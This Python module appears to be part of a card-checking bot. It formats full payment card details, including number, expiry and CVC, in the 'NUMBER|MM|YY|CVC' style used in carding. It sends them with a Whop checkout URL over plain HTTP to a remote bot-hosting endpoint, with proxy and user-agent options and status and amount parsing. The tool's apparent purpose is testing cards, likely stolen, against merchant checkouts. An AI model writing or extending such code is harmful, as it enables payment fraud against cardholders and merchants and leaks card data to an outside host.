import subprocess
import sys
import time
import logging
import requests

# Auto-install requests if missing
try:
    import requests
except ImportError:
    print("Installing required package: requests...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("whop_api")

# Your new API endpoint
API_ENDPOINT = "http://fi4.bot-hosting.cloud:26219/checkout"

class WhopCheckout:
    def __init__(self, cfg: dict):
        self.cfg = dict(cfg)
        # Format the card string for the API
        self.card_str = f"{self.cfg.get('card_number', '')}|{self.cfg.get('card_exp_month', '')}|{self.cfg.get('card_exp_year', '')}|{self.cfg.get('card_cvc', '')}"
        self.url = self.cfg.get('product_url', '')

    def run_api(self):
        """Sends the request to the new API and returns the formatted response."""
        t0 = time.time()
        
        params = {
            'checkout_url': self.url,
            'cc': self.card_str
        }
        
        try:
            log.info(f"Sending request to API for card {self.card_str[:6]}...")
            response = requests.get(API_ENDPOINT, params=params, timeout=120)
            response.raise_for_status()
            result = response.json()
            
            # Map the API response to what the bot expects
            out = {
                "status": result.get("status", "unknown"),
                "message": result.get("message", ""),
                "code": result.get("code", ""),
                "amount": result.get("amount", "?"),
                "currency": result.get("currency", "USD"),
                "elapsed_ms": round((time.time() - t0) * 1000)
            }
            return out
            
        except requests.exceptions.RequestException as e:
            log.error(f"API request failed: {e}")
            return {
                "status": "error",
                "message": f"API request failed: {str(e)}",
                "code": "api_error",
                "amount": "?",
                "currency": "USD",
                "elapsed_ms": round((time.time() - t0) * 1000)
            }

# Keep these for compatibility with bot.py
CONFIG = {
    "product_url": "",
    "email": "",
    "card_number": "",
    "card_exp_month": 0,
    "card_exp_year": 0,
    "card_cvc": "",
    "proxy": "",
    "user_agent": ""
}

def _parse_cc(cc):
    parts = cc.split("|")
    if len(parts) != 4:
        return None, "cc must be NUMBER|MM|YY|CVC"
    num = parts[0].replace(" ", "").replace("-", "")
    if not num.isdigit() or len(num) < 13:
        return None, "Invalid card number"
    mon = int(parts[1])
    if not (1 <= mon <= 12):
        return None, "Invalid month (1-12)"
    yr = int(parts[2]); yr = yr + 2000 if yr < 100 else yr
    if yr < 2024:
        return None, "Card expired"
    return {"num": num, "mon": mon, "yr": yr, "cvc": parts[3]}, None

def _build_cfg(url, email, cc, proxy="", ua="", plan=""):
    return {
        "product_url": url,
        "email": email,
        "card_number": cc["num"],
        "card_exp_month": cc["mon"],
        "card_exp_year": cc["yr"],
        "card_cvc": cc["cvc"],
        "proxy": proxy,
        "user_agent": ua
    }
